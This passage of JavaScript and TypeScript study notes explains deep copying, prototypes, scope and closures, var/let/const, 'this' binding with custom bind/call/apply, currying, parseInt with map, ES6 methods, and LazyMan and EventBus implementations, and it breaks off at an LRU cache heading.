Using `JSON.stringify` followed by `JSON.parse` is a quick method to deep copy objects without nested structures or special types. However, this approach has significant limitations:

- **Loses Map and Set data:** When Maps and Sets are passed through this process, they are converted into objects and arrays, respectively, losing their inherent properties and behaviors.
- **Fails with circular references:** If the object contains circular references (objects referencing themselves directly or indirectly), `JSON.stringify` will throw an error, as it cannot serialize cyclic structures.
- **Does not copy special objects correctly:** Certain JavaScript objects like functions, `undefined`, and special objects (e.g., `RegExp`, `Date`) cannot be accurately cloned through this method, resulting in loss of information or incorrect copying.

### Handling Maps, Sets, and Circular References

To address these limitations, a custom deep copy function is required. This function must thoughtfully handle various data structures, including Maps, Sets, and objects with circular references, ensuring an accurate and efficient cloning process. Below is an enhanced TypeScript implementation that covers these cases effectively:

```typescript
function deepCopy(obj: any, map = new WeakMap()): any {
  // Directly return if obj is null or not an object (e.g., primitives and functions)
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }

  // Use an existing reference from map if obj was already copied (circular reference handling)
  if (map.has(obj)) {
    return map.get(obj);
  }

  let copy;

  // Clone Date objects by creating a new instance with the same time value
  if (obj instanceof Date) {
    copy = new Date(obj.getTime());
  }
  // Clone RegExp objects by creating a new instance with the same pattern and flags
  else if (obj instanceof RegExp) {
    copy = new RegExp(obj.source, obj.flags);
  }
  // Deep copy Map objects by iterating over entries and recursively copying them
  else if (obj instanceof Map) {
    copy = new Map();
    obj.forEach((value, key) => {
      copy.set(key, deepCopy(value, map));
    });
  }
  // Deep copy Set objects by iterating over values and recursively copying them
  else if (obj instanceof Set) {
    copy = new Set();
    obj.forEach(value => {
      copy.add(deepCopy(value, map));
    });
  }
  // Handle Arrays and plain Objects by creating an empty structure and recursively copying properties
  else {
    copy = Array.isArray(obj) ? [] : {};
    map.set(obj, copy); // Track the object copy to handle circular references
    Object.keys(obj).forEach(key => {
      copy[key] = deepCopy(obj[key], map);
    });
  }

  return copy;
}
```

### Key Points

- **Circular Reference Handling:** Utilizes a `WeakMap` to keep track of previously copied objects. This prevents infinite loops by reusing the copied reference instead of attempting to copy the object again.
- **Special Object Cloning:** Provides tailored cloning strategies for `Date` and `RegExp` objects, ensuring that their unique properties and behaviors are preserved in the copy.
- **Recursive Deep Copy:** Employs a recursive approach to accurately copy nested structures, including objects, arrays, Maps, and Sets. This ensures that the deep copy function can handle complex and deeply nested data structures effectively.

### Special Object Cloning - `Date` and `RegExp`
`Date` and `RegExp` objects have unique properties and methods that are not enumerable and cannot be copied over by simply iterating over their keys. For instance:
- A `Date` object encapsulates a single moment in time, represented internally as a timestamp (the number of milliseconds since the Unix Epoch). This value is not directly accessible as an enumerable property that can be copied.
- A `RegExp` object contains a pattern and flags (such as global, multiline, etc.), which are crucial for its operation. These are accessed through properties like source and flags, not directly copyable via key enumeration.

## Why Define Class Functions in Constructor Prototype?

In JavaScript, using the prototype property of constructor functions to define methods offers substantial benefits in terms of efficiency, inheritance, and code manageability. This section delves into these advantages, supported by a structured, example-driven approach.

### Memory Efficiency
**Utilizing Prototypes**: Implementing methods on the prototype allows these methods to be shared among all instances of the constructor, rather than being duplicated within each instance. This approach significantly conserves memory, which is particularly advantageous in applications generating large numbers of instances, thereby enhancing overall performance.

### Inheritance Support
**Enabling Polymorphism**: Methods defined on the prototype facilitate inheritance across instances and derived classes. This capability is crucial for implementing polymorphic behaviors where methods can be overridden or extended in subclasses, enhancing code reusability and flexibility.

### Dynamic Updates
**Streamlining Code Maintenance**: Adding methods to the prototype ensures that they are instantly available to all existing instances. This feature allows for flexible and swift modifications to the behavior of applications without the need to recreate objects, simplifying ongoing maintenance.

### Practical Example: Implementing the `Animal` Class

Consider the `Animal` class, where each instance can perform common actions like making a sound. Defining these methods on the prototype rather than directly in the constructor not only optimizes memory usage but also increases adaptability.

```javascript
function Animal(name) {
    this.name = name;
}

// Adding a method to the prototype
Animal.prototype.makeSound = function() {
    console.log(`${this.name} makes a sound.`);
};

// Creating instances
const dog = new Animal('Dog');
const cat = new Animal('Cat');

// Testing the method
dog.makeSound(); // Output: Dog makes a sound.
cat.makeSound(); // Output: Cat makes a sound.
```

### Key Takeaways
- **Memory Conservation**: The `makeSound` method is shared across all `Animal` instances, significantly conserving memory.
- **Enhanced Flexibility**: Any modifications to `Animal.prototype` automatically reflect across all instances, demonstrating the practical benefits of dynamic updates and inheritance.
# 2.4 Scope & Closure.md

## What is Scope in JavaScript?
Scope in JavaScript is a fundamental concept that determines the accessibility of variables, functions, and objects at various levels throughout your code. 

### Types of Scope in JavaScript
JavaScript implements several layers of scope, each defining a distinct level of variable accessibility from the most general to the most specific: global, local (function), block, and module.

### Global Scope
Variables and functions in the global scope are accessible from any part of the code. This scope is the outermost layer where any variable or function not contained within a specific block or function belongs.

**Example of Global Scope**:
```javascript
var globalVariable = 'I am a global variable';
console.log(globalVariable); // Output: I am a global variable
```

**Global Scope and the `window` Object**:
In browser environments, global scope variables and functions become properties of the `window` object, allowing them to be accessed via this global context.

**Key Features of the `window` Object**:
1. **DOM Management**: Access and manipulate the Document Object Model (DOM) through `window.document`.
2. **URL and Navigation**: Manage the browser's URL and navigation state with `window.location`.
3. **Debugging Utilities**: Utilize debugging tools such as `window.console`.
4. **User Interaction**: Interact with the user via `window.alert`, `window.confirm`, and `window.prompt`.
5. **Web Storage**: Store data locally with `window.localStorage` and `window.sessionStorage`.
6. **Timers**: Implement delays and intervals using `window.setTimeout` and `window.setInterval`.
7. **Networking**: Make network requests using `window.fetch`.
8. **Event Handling**: Manage event listeners with `window.addEventListener` and `window.removeEventListener`.
9. **Window Management**: Control browser windows through `window.open` and `window.close`.

### Local Scope (Function Scope)
Local scope restricts variable access to the function in which they are declared, significantly enhancing security and memory management.

**Example of Local Scope**:
```javascript
function localScopeExample() {
    var localVariable = 'I am a local variable';
    console.log(localVariable); // Output: I am a local variable
}
localScopeExample();
console.log(localVariable); // Error: localVariable is not defined
```

### Block Scope
Introduced with ES6, `let` and `const` provide block-level scope, which restricts variable access to the specific block where they are declared, such as within `if` statements or loops.

**Example of Block Scope**:
```javascript
if (true) {
    let blockScopedVariable = 'I am block scoped';
    console.log(blockScopedVariable); // Output: I am block scoped
}
console.log(blockScopedVariable); // Error: blockScopedVariable is not defined
```

### Lexical Scope
JavaScript employs lexical scoping where a function enclosed within another function has access to the outer function's scope.

**Example of Lexical Scope**:
```javascript
function outerFunction() {
    var outerVariable = 'I exist in the outer function';
    function innerFunction() {
        console.log(outerVariable); // Output: I exist in the outer function
    }
    innerFunction();
}
outerFunction();
```

### Module Scope
With ES6 modules, scope is limited to the module itself, helping avoid global namespace pollution and fostering better modularity.

### Scope Linking in JavaScript
JavaScript's scope chaining enables variable resolution along the scope chain, ensuring variables defined in outer scopes are accessible in inner scopes.

**Example of Scope Linking**:
```javascript
var globalVar = 'accessible everywhere';

function outerFunc() {
    var outerVar = 'accessible in this function and its inner functions';
    function innerFunc() {
        var innerVar = 'only accessible in this function';
        console.log(globalVar);  // Output: accessible everywhere
        console.log(outerVar);  // Output: accessible in this function and its inner functions
        console.log(innerVar);  // Output: only accessible in this function
    }
    innerFunc();
}
outerFunc();
```

## What is Closure

A closure is a function combined with its lexical environment, which allows it to access variables from the outer function’s scope even after the outer function has returned. This feature is crucial in JavaScript and enables powerful programming patterns.

```javascript
function outerFunction() {
    var outerVariable = 'I am outside!';
    function innerFunction() {
        console.log(outerVariable);
    };
    return innerFunction;
}

var innerFunc = outerFunction();
innerFunc(); // Output: 'I am outside!'
```

### Practical Applications of Closures

**Event Handlers**  
Closures enable JavaScript developers to manage changes in state in a controlled manner. For example, adjusting the font size of a text element upon a button click is a typical use case:

```html
<div id="text">Hello, World!</div>
<button id="button">Change Font Size</button>
<script>
    function changeFontSize(size) {
        return function() {
            document.getElementById('text').style.fontSize = size + 'px';
        }
    }

    document.getElementById('button').addEventListener('click', changeFontSize(20));
</script>
```

**Creating Private Variables**  
Closures facilitate the creation of private variables that cannot be accessed directly from outside the function, thereby emulating private methods and properties:

```javascript
function makeCounter() {
    var count = 0;
    return {
        increment: function() {
            count++;
            console.log(count);
        },
        decrement: function() {
            count--;
            console.log(count);
        }
    }
}

var counter1 = makeCounter();
var counter2 = makeCounter();
counter1.increment(); // Output: 1
counter1.increment(); // Output: 2
counter2.increment(); // Output: 1
```

**Event Binding within Loops**  
Using closures within loops to bind event listeners avoids common pitfalls related to JavaScript’s lexical scoping:

```html
<div>0</div>
<div>1</div>
<div>2</div>
<div>3</div>
<div>4</div>
<script>
    var divs = document.getElementsByTagName('div');
    for (var i = 0; i < divs.length; i++) {
        (function(i) {
            divs[i].addEventListener('click', function() {
                console.log('You clicked on element #' + i);
            });
        })(i);
    }
</script>
```

### Memory Management and Closures

**Potential Memory Issues**  
While closures are powerful, they can lead to memory issues if not used carefully. For instance, closures in loops that capture large objects or DOM elements can lead to memory leaks in older browsers:

```javascript
function outerFunction() {
    var outerVariable = 'I am outside!';
    function innerFunction() {
        console.log(outerVariable);
    };
    return innerFunction;
}

var innerFunc = outerFunction();
innerFunc(); // Output: 'I am outside!'
```

**Modern Garbage Collection**  
Modern browsers implement the mark-and-sweep garbage collection algorithm which mitigates issues with closures and memory leaks that were prevalent in older browsers using reference counting.

## JavaScript Variable Declarations: `var`, `let`, and `const`
### `var` Declaration
**Hoisting and Function Scope**

The `var` keyword declares a variable that is hoisted to the top of its functional or global scope, despite where it is defined. This hoisting means the variable is moved to the top of its containing scope during execution but is not initialized until its declaration is reached in the code.

```javascript
console.log(a); // Outputs: undefined
var a = 10;
console.log(a); // Outputs: 10
function foo() {
    console.log(a); // Outputs: undefined
    var a = 20;
    console.log(a); // Outputs: 20
}
```

**Key Characteristics:**
- Variables are hoisted and accessible within their scope, but only initialized where defined.
- Can be redeclared within the same scope without errors.

### `let` Declaration
**Block Scope and No Hoisting**

Unlike `var`, `let` is block-scoped and is not hoisted, which means the variable only exists within the block it is declared and cannot be accessed before its declaration.

```javascript
console.log(a); // Throws ReferenceError: Cannot access 'a' before initialization
let a = 10;
console.log(a); // Outputs: 10
function foo() {
    console.log(a); // Throws ReferenceError: Cannot access 'a' before initialization
    let a = 20;
    console.log(a); // Outputs: 20
    // let a = 30; // SyntaxError: Identifier 'a' has already been declared
}
console.log(a); // Outputs: 10
```

**Key Characteristics:**
- Block-scoped: accessible only within the block where declared.
- Cannot be accessed before declaration, preventing runtime errors due to uninitialized variables.
- Cannot be redeclared within the same block.

### `const` Declaration
**Block Scope and Immutable Binding**

`const` behaves like `let` in terms of block scope and no hoisting, but it requires that the variable be initialized at the time of declaration. Once set, the variable’s binding cannot be reassigned, although the content of mutable objects can still be altered.

```javascript
console.log(a); // Throws ReferenceError: Cannot access 'a' before initialization
// const a; // SyntaxError: Missing initializer in const declaration
const a = 10;
console.log(a); // Outputs: 10
// a = 20; // TypeError: Assignment to constant variable

const b = [];
b[0] = 10; // Allowed: modifying an object's content
// b = [10]; // SyntaxError: Assignment to constant variable
```

**Key Characteristics:**
- Block-scoped and requires initial value.
- The binding is immutable, meaning the variable identifier cannot be reassigned.
- Suitable for declaring constants where the value should not change through reassignment.

# 2.5 Functions & this.md

## `this` Keyword in JavaScript
`this` value depends on where and how the function it refers to is called.

### `this` in Different Contexts:

1. **Global Context**
   In the global execution context (outside of any function), `this` refers to the global object. In web browsers, this global object is `window`, which means `this` equates to `window` at the global level.

   ```javascript
   console.log(this === window); // true
   var myFunction = function() {
     console.log(this === window); // true
   };
   myFunction();
   ```

2. **Function Context**
   The value of `this` within a function is determined by how the function is invoked.

   - **Regular Functions:** 
     In non-strict mode, `this` defaults to the global object (`window` in web browsers). However, if the function runs in strict mode (`'use strict'`), `this` will be `undefined` unless explicitly set upon invocation.

     ```javascript
     function myFunction() {
       'use strict';
       console.log(this); // undefined in strict mode
     }
     myFunction();
     ```

   - **Arrow Functions:** 
     Unlike regular functions, arrow functions do not have their own `this` context. Instead, they lexically capture the `this` value of their enclosing scope. This characteristic makes arrow functions ideal for use as callbacks, where maintaining the `this` context is required.

     ```javascript
     const myObject = {
       myMethod: function() {
         console.log(this); // `this` refers to myObject
         setTimeout(() => {
           console.log(this); // `this` still refers to myObject, thanks to arrow function
         }, 1000);
       }
     };
     myObject.myMethod();
     ```

3. **Object Context**
   When a function is invoked as a method of an object, `this` refers to the object to which the method belongs.

   ```javascript
   const myObject = {
     myMethod: function() {
       console.log(this); // `this` refers to myObject
     }
   };
   myObject.myMethod();
   ```

4. **Constructor Context**
   In the context of a constructor function called with the `new` keyword, `this` refers to the newly created instance that the constructor returns.

   ```javascript
   function MyConstructor() {
     this.myProperty = 'value';
   }
   const myInstance = new MyConstructor();
   console.log(myInstance.myProperty); // 'value'
   ```

5. **Explicit Binding**
   The value of `this` can be explicitly defined using `.call()`, `.apply()`, or `.bind()`, thereby overriding the default context.

   - **.call()** and **.apply()** both invoke the function immediately but differ in how additional arguments to the function are passed. `.call()` accepts an argument list, while `.apply()` accepts a single array of arguments.

     ```javascript
     function myFunction(a, b) {
       console.log(this);
       console.log(a + b);
     }

     myFunction.call({my: 'object'}, 1, 2); // Logs: {my: 'object'} and 3
     myFunction.apply({my: 'object'}, [1, 2]); // Logs: {my: 'object'} and 3
     ```

   - **.bind()** returns a new function with a specified `this` value, allowing you to invoke the function later with the context already set.

     ```javascript
     const boundFunction = myFunction.bind({my: 'object'}, 1, 2);
     boundFunction(); // Logs: {my: 'object'} and 3
     ```

## Implementing a `bind` Function

The `bind` function in JavaScript is essential for setting the `this` context of a function explicitly. It ensures predictable function execution by setting `this` to a specific object, regardless of how the function is called.

### Application of `bind`:

- **Returns a New Function**: Unlike `call` and `apply`, which execute the function immediately, `bind` returns a new function. When called, this new function has its `this` context and any initial arguments pre-set.
- **Binds `this` and Partial Arguments**: `bind` allows for the binding of the `this` context to an object and permits partial application of arguments, enabling some function arguments to be pre-filled and the rest supplied upon calling the bound function.
- **Arrow Function Limitation**: Arrow functions do not have their own `this` context but inherit it from the surrounding lexical context. Thus, using `bind` to change the `this` context of an arrow function is ineffective. However, `bind` can still be used to pre-fill parameters.
- **Use as a Constructor**: If a bound function is used as a constructor with the `new` keyword, `this` within the function body points to the new object being created. This is despite any explicit binding set by `bind`.
- **Normal Function Call**: In a regular function call scenario, `this` refers to the object that was bound using `bind`, which ensures a consistent context in callbacks and event handlers.

### Implementation Strategy:

Implementing `bind` involves creating a new function that, upon invocation, calls the original function with a predetermined `this` context and a combination of pre-bound and newly provided arguments.

### Example:

```typescript
function fn(a, b) {
    console.log(this, a, b);
}

const obj = { name: 'ronron' };
const boundFn = fn.bind(obj, 1); // Binds 'obj' as 'this' and '1' as the first argument
boundFn(2); // Output: { name: 'ronron' } 1 2
```

### Custom `bind` Implementation:

```typescript
Function.prototype.myBind = function (context, ...preBoundArgs) {
    const originalFunction = this; // Capture the original function
    return function(...newArgs) {
        // Combine pre-bound arguments with new ones
        return originalFunction.apply(context, preBoundArgs.concat(newArgs));
    };
};
```

## Implementing `call` and `apply` Functions

`call` and `apply` are indispensable for immediate function invocation with an explicitly specified `this` context and arguments.

### Binding `this`

- `bind`, `call`, and `apply` are all crucial for setting a function's `this` context in JavaScript.
- In contrast to `bind`, which returns a new function, `call` and `apply` invoke the function right away with a specified `this` context.
- The primary difference between `call` and `apply` lies in their handling of function arguments: `call` accepts an enumerated list of arguments, while `apply` expects an array of arguments.

## Custom Implementation of `call` and `apply`

```typescript
Function.prototype.myCall = function (context = window, ...args) {
    const uniqueKey = Symbol(); // Use Symbol to create a unique key and avoid property conflicts
    context[uniqueKey] = this; // 'this' refers to the current function to be executed
    const result = context[uniqueKey](...args); // Execute the function with 'this' bound to the context and the provided arguments
    delete context[uniqueKey]; // Remove the temporary function reference to clean up
    return result;
};

// For myApply, adjust to accept an array of arguments
Function.prototype.myApply = function (context = window, args = []) {
    const uniqueKey = Symbol(); // Unique property key
    context[uniqueKey] = this; // Assign function to context
    const result = context[uniqueKey](...args); // Execute with array of arguments spread into function
    delete context[uniqueKey]; // Cleanup
    return result;
};
```

## Drawbacks of Arrow Functions and Situations Where They Can't Be Used

Arrow functions, introduced in ES6, provide a concise syntax and lexically bind the `this` value, but they have limitations in certain scenarios:

### Arrow Functions and `this` Context
Arrow functions do not have their own `this` context; they inherit it from the enclosing lexical scope. This feature is beneficial in some cases, such as callbacks where maintaining `this` from the outer context is desired. However, it limits their usage in other scenarios:

1. **Dynamic Context Callback Functions**: In event handlers, the `this` context is expected to be the element triggering the event. Arrow functions do not suit this because they do not bind their own `this`.

   ```typescript
   const btn = document.getElementById('btn');
   btn.addEventListener('click', () => {
       console.log(this === window); // `this` refers to the window, not the button
       // `this.innerHTML` will not work as expected
   });
   ```

2. **Function Scope and `this`**: In regular functions, `this` refers to the function's execution context, but in arrow functions, it refers to the enclosing context.

   ```typescript
   function f1() {
       console.log(this); // refers to the function's execution context
   }

   const f2 = () => {
       console.log(this); // refers to the lexical scope's context
   };
   ```

### `arguments` Object and Rest Parameters
Arrow functions do not have an `arguments` object, unlike regular functions. This limitation can be circumvented using rest parameters.

```typescript
function f1() {
   // Access to `arguments` object
}

const f2 = (...args) => {
   // Use `args` as an alternative to `arguments`
};
```

### Object and Prototype Methods
Arrow functions are not suitable for defining object or prototype methods where `this` is expected to refer to the object itself.

1. **Object Methods**:
   ```typescript
   const obj = {
       name: 'aaa',
       getName: () => this.name // `this` does not refer to `obj`
   };

   obj.getName(); // Will not work as expected, returns global object's `name`
   ```

2. **Prototype Methods**:
   ```typescript
   function MyObject() {
       this.name = 'aaa';
   }

   MyObject.prototype.getName = () => this.name; // `this` does not refer to the instance of `MyObject`

   const myObj = new MyObject();
   myObj.getName(); // Will not work as expected, returns global object's `name`
   ```

### Constructors
Arrow functions cannot be used as constructors. They cannot be used with the `new` keyword as they do not have their own `this` context, nor do they have a prototype.

```typescript
const Foo = (name, age) => {
    this.name = name;
    this.age = age;
};

const f = new Foo('aa', 20); // TypeError: Foo is not a constructor
```

**Summary**  
While arrow functions offer concise syntax and are useful in many cases, especially for inline functions and callbacks, their inability to bind their own `this`, lack of an `arguments` object, and unsuitability for object methods, prototype methods, and constructors limit their applicability in certain JavaScript programming scenarios.

## Understanding Function Parameters and Arguments in JavaScript

### Formal and Actual Parameters
- **Formal parameters** are the parameters defined in a function's declaration.
- **Actual parameters** are the arguments passed to the function at call time.

### Primitive Types and Value Passing
- **Primitive Types**: Includes data types like numbers, strings, booleans, undefined, null, symbol, and BigInt.
- **Behavior**: When these types are passed to a function, JavaScript creates a copy of the value (pass-by-value). Modifications to the parameter within the function do not affect the original variable.
- **Example**:
  ```javascript
  function modifyPrimitive(value) {
      value = "changed";
      console.log("Inside function:", value); // Outputs: "Inside function: changed"
  }

  let originalValue = "original";
  modifyPrimitive(originalValue);
  console.log("Outside function:", originalValue); // Outputs: "Outside function: original"
  ```

### Reference Types and Reference Passing
- **Reference Types**: Includes objects, arrays, and functions.
- **Behavior**: Passing a reference type as an argument results in a copy of the reference being passed, not the actual object. Modifications to the object's properties affect the original object (pass-by-reference-like behavior).
- **Example**:
  ```javascript
  function modifyObject(obj) {
      obj.property = "modified";
      console.log("Inside function:", obj.property); // Outputs: "Inside function: modified"
  }

  let originalObject = { property: "original" };
  modifyObject(originalObject);
  console.log("Outside function:", originalObject.property); // Outputs: "Outside function: modified"
  ```

### Detailed Behavior Explanation
- **Initial Setup**: An object `obj` is initialized with `x` set to 0.
- **Function Behavior**:
  - Modifying `obj.x` within the function affects `obj` outside the function due to reference passing.
  - Reassigning the reference `a` inside the function to a new object does not affect the original object `obj`.

  ```javascript
  function modifyObject(a) {
      a.x = 1;
      console.log(a.x);  // Outputs: 1
      a = { x: 3 };
      console.log(a.x);  // Outputs: 3
  }

  var obj = { x: 0 };
  modifyObject(obj);
  console.log(obj.x); // Outputs: 1
  ```

### Best Practices
- **Immutability**: Treat parameters as immutable to avoid side effects.
- **Copying Objects**: Use a deep copy for modifications to preserve the original data.
- **Documentation**: Clearly document any modifications within functions.
- **Functional Programming**: Emphasize immutability and side-effect-free functions for clarity and predictability.

## Constructor Functions and Prototype Properties with the Same Name
```javascript
function Foo(){
    Foo.a = function(){
        console.log(1)
    }
    this.a = function(){
        console.log(2)
    }
}
Foo.prototype.a = function(){
    console.log(3)
}
Foo.a = function(){
    console.log(4)
}
Foo.a(); // Output: 4
let obj = new Foo(); 
obj.a(); // Output: 2
Foo.a(); // Output: 1
```

### Step-by-Step Breakdown

1. **Function Definition and Static Property Initialization**

   Initially, a function `Foo` is defined. Following its definition, `Foo.a` is assigned a function that logs `4`. This is a static property of the `Foo` function itself, not of its instances.

2. **Static Method Invocation**

   Invoking `Foo.a()` at this point outputs `4`, as it calls the function assigned to `Foo.a` before any instances of `Foo` are created.

3. **Instance Creation**

   When a new instance of `Foo` is created (`let obj = new Foo()`), several things happen inside the constructor function:
   
   - `Foo.a` is redefined to a function that logs `1`. This redefinition overwrites the initial static definition of `Foo.a` that logged `4`.
   - `this.a` is defined as a function that logs `2`. This assigns an `a` function to the newly created instance, which is separate from `Foo`'s static properties and its prototype.

4. **Instance Method Invocation**

   Invoking `obj.a()` now outputs `2`. This is because the instance (`obj`) has its own `a` property, which takes precedence over the `Foo` prototype's `a` property.

5. **Static Method Post-Instance Invocation**

   Calling `Foo.a()` after creating an instance of `Foo` outputs `1`. This is because the creation of an instance (`new Foo()`) redefined `Foo.a` to a new function that logs `1`.

**Key Takeaways**  
- **Static vs. Instance Properties**: Static properties defined on a constructor function itself (`Foo.a`) are separate from instance properties defined within the constructor using `this` keyword (`this.a`).
- **Prototype Properties**: Properties defined on the prototype (`Foo.prototype.a`) are shared across all instances. However, they have lower precedence compared to instance-specific properties.
- **Precedence and Overwriting**: When accessing a property, instance properties take precedence over prototype properties. Static properties can be redefined, affecting their behavior when accessed before and after instance creation.

## Write a `curry` function to curry other functions
Currying is the process of transforming a function with multiple arguments into a sequence of nesting functions that each take a single argument. Its main benefits include **parameter reuse, delayed execution, early return, and function composition**.

```ts
function curry(fn: Function) {
    return function curried(...args: any[]) {
        if (args.length >= fn.length) {
            return fn.apply(this, args);
        } else {
            return function (...nextArgs: any[]) {
                return curried.apply(this, args.concat(nextArgs));
            };
        }
    };
}

function sum(a: number, b: number, c: number) {
    return a + b + c;
}

const curriedSum = curry(sum);
console.log(curriedSum(1)(2)(3)); // Output: 6
console.log(curriedSum(1, 2)(3)); // Output: 6
console.log(curriedSum(1)(2, 3)); // Output: 6
```

## Understanding `['1', '2', '3'].map(parseInt)` Output
The `parseInt` function converts a string argument to an integer of the specified radix (base). Its signature is `parseInt(string, radix)`, where:
- `string` is the string to be parsed.
- `radix` (optional) specifies the base of the numeral system to be used. It can be between 2 and 36.

If `radix` is 0, unspecified, or derived from the string's prefix (e.g., `0x` for hexadecimals), `parseInt` will attempt to guess the radix:

- Hexadecimal (base 16) if the string starts with "0x" or "0X".
- Decimal (base 10) for all other cases.

However, to avoid confusion and ensure consistent results, it's recommended always to specify the radix.

### Examples of `parseInt` Usage:

```typescript
parseInt('11', 2); // Returns 3. ('11' in binary equals 3 in decimal)
parseInt('3', 2); // Returns NaN. ('3' is not a valid binary number)
parseInt('A', 16); // Returns 10. ('A' in hexadecimal equals 10 in decimal)
parseInt('0x2F'); // Returns 47. Implicitly detects hexadecimal.
parseInt('1', 0); // Returns 1. (0 or unspecified radix defaults to base 10)
```

### Why `['1', '2', '3'].map(parseInt)` Returns `[1, NaN, NaN]`

When using `map` with `parseInt`, each element of the array is passed to `parseInt` along with its index. The `map` method calls the callback with three arguments: the current element, its index, and the entire array. In the case of `parseInt`, this means the second argument (the index) is used as the radix.

Breaking it down:

- `parseInt('1', 0)`: The radix is `0`, so `parseInt` treats it as base 10. The result is `1`.
- `parseInt('2', 1)`: The radix is `1`, which is not a valid radix, leading to `NaN`.
- `parseInt('3', 2)`: The radix is `2` (binary), and since '3' is not a valid binary digit, the result is `NaN`.

```typescript
const arr = ['1', '2', '3'];
const res = arr.map((item, index) => {
    // For '1', index is 0: parseInt('1', 0) => 1, since 0 is treated as base 10.
    // For '2', index is 1: parseInt('2', 1) => NaN, since 1 is not a valid radix.
    // For '3', index is 2: parseInt('3', 2) => NaN, since '3' is not a valid binary digit.
    return parseInt(item, index);
});
```

## New Methods Introduced in ES6
### Object Methods
**Object Manipulation Functions**
- **Object.is(obj1, obj2)**: Compares two objects. It returns `true` if both objects are identical. This method is similar to the strict equality operator `===`, but also handles special cases like comparing `NaN` to itself, where it returns `true` (unlike `===`).
- **Object.assign(target, source)**: Copies all enumerable own properties from one or more source objects to a target object. It returns the modified target object. Useful for cloning and merging objects without additional libraries.

**Retrieval Functions**
- **Object.keys(obj)**: Returns an array containing the names of all own enumerable property names of the object.
- **Object.values(obj)**: Returns an array containing the values corresponding to all own enumerable property values of the object.
- **Object.entries(obj)**: Returns an array of arrays, each inner array is a [key, value] pair from the object. This is useful for iterating over objects using the new `for...of` loop.

### Array Methods
**Creation Functions**
- **Array.from(obj, mapFn?, thisArg?)**: Creates a new, shallow-copied Array instance from an array-like or iterable object. Optional parameters allow mapping each element through a function, transforming them during creation.
- **Array.of(...elements)**: Creates a new Array instance with a variable number of elements, regardless of number or type of the arguments. This method is especially useful when you want to create an array from a set of elements.

#### Practical Examples

**Using Object.assign to merge objects:**
```javascript
const obj1 = { a: 1 };
const obj2 = { b: 2 };
const mergedObj = Object.assign({}, obj1, obj2);
console.log(mergedObj); // Output: { a: 1, b: 2 }
```

**Using Array.from to convert a NodeList to an Array:**
```javascript
const nodeList = document.querySelectorAll('div'); // NodeList of div elements
const nodesArray = Array.from(nodeList);
console.log(nodesArray); // Output: [div, div, ...]
```
# 2.6 Implementations.md

## Implement `LazyMan` Class

The `LazyMan` class simulates a sequence of actions for an individual, incorporating actions such as eating or sleeping. Allows for the chaining of `eat` and `sleep` methods, improving code readability and flow. Utilizes JavaScript's event loop to introduce a delay with the `sleep` method before continuing to the next action, demonstrating asynchronous behavior.

```typescript
class LazyMan {
    private taskList: Array<Function>; // Holds a queue of tasks (actions) to be executed.
    private name: string;

    constructor(name: string) {
        this.name = name;
        this.taskList = [];
        setTimeout(() => { // Initiates task execution asynchronously.
            this.next();
        }, 0);
    }

    eat(food: string) {
        this.taskList.push(() => { // Queues an eating action.
            console.log(`eat ${food}`);
            this.next(); // Proceeds to the next queued action.
        });
        return this; // Facilitates method chaining by returning the LazyMan instance.
    }

    sleep(time: number) {
        this.taskList.push(() => { // Queues a sleeping action with a delay.
            setTimeout(() => {
                console.log(`wake up after ${time}`);
                this.next(); // Continues to the next action after the delay.
            }, time);
        });
        return this; // Allows for continued chaining.
    }

    next() {
        const fn = this.taskList.shift(); // Dequeues the next action.
        fn && fn(); // Executes the action if it exists.
    }
}

const me = new LazyMan('ronron');
me.eat('apple').sleep(1000).eat('banana').sleep(1000).eat('pear');
```
- **Chainable Methods**: Achieved by returning the instance itself (`this`) from each method, allowing for a fluent interface where methods can be called sequentially on the same object.
- **Asynchronous Execution**: Demonstrates the use of JavaScript's `setTimeout` to introduce execution delays, simulating sleep and showcasing asynchronous programming principles. The setTimeout in constructor initiates the asynchronous execution of the first task in the taskList, allowing for a delayed start of the queued actions.The first `this.next` actually starts when the synchronous code finishes, i.e. at `me.eat('apple').sleep(1000).eat('banana').sleep(1000).eat('pear');` line.

## Implementing a Custom EventBus

An **EventBus** is a design pattern that enhances loose coupling among components within software applications. This pattern allows components to communicate with each other without having direct dependencies or knowledge about each other, thereby promoting modularity and ease of integration.

### Methods
The EventBus pattern is implemented through several methods that manage the lifecycle of events and their listeners:

- **on(event: string, listener: Function)**: Registers a listener to an event. The listener can be triggered multiple times for as long as it remains bound to the event. It remains active until it is explicitly removed with the `off` method.

- **once(event: string, listener: Function)**: Similar to `on`, but the listener is designed to be triggered only once. After it is triggered, the listener is automatically removed. It can also be manually removed before it is triggered by using the `off` method.

- **emit(event: string, ...args: any[])**: Triggers all listeners bound to a specific event, passing along any arguments to the listeners.

- **off(event: string, listener: Function)**: Removes a specific listener from an event. This is crucial for managing the lifecycle of listeners and can be used for listeners registered with both `on` and `once`.

### Data Structure
Internally, the EventBus class uses a `Record<string, Function[]>` to maintain a map between event names and arrays of listener functions. This data structure ensures a systematic and type-safe way to manage event-listener relationships.

### Implementation in TypeScript
```typescript
class EventBus {
    private events: Record<string, Function[]>; // Stores event-to-listener mappings

    constructor() {
        this.events = {};
    }

    // Registers a listener for an event for multiple triggers
    on(event: string, listener: Function): void {
        if (!this.events[event]) {
            this.events[event] = [];
        }
        this.events[event].push(listener);
    }

    // Registers a listener for a single trigger on an event
    once(event: string, listener: Function): void {
        const onceListener = (...args: any[]) => {
            listener(...args); // Trigger the original listener
            this.off(event, onceListener); // Automatically remove after execution
        };
        this.on(event, onceListener); // Use `on` to bind the wrapper listener
    }

    // Triggers all listeners for an event, passing additional arguments
    emit(event: string, ...args: any[]): void {
        if (this.events[event]) {
            this.events[event].forEach(listener => listener(...args));
        }
    }

    // Removes a listener from an event
    off(event: string, listener: Function): void {
        if (this.events[event]) {
            this.events[event] = this.events[event].filter(l => l !== listener);
        }
    }
}

const eventBus = new EventBus();

// Bind the 'click' event
eventBus.on('click', () => console.log('clicked'));

// Bind the 'hover' event for a single-time execution
eventBus.once('hover', () => console.log('hovered'));

// Emit the 'click' event
eventBus.emit('click'); // Output: clicked

// Emit the 'hover' event
eventBus.emit('hover'); // Output: hovered
// Trying to emit 'hover' again will result in no output, as the once-bound listener is removed after execution

// Unbind the 'click' event
const clickListener = () => console.log('clicked');
// Note: This demonstrates the concept, but to successfully unbind, the original function reference must be used
eventBus.off('click', clickListener);
eventBus.emit('click'); // There will be no output if the exact function reference was used for both binding and unbinding
```

## Implementing the Least Recently Used (LRU) Cache Algorithm in JavaScript

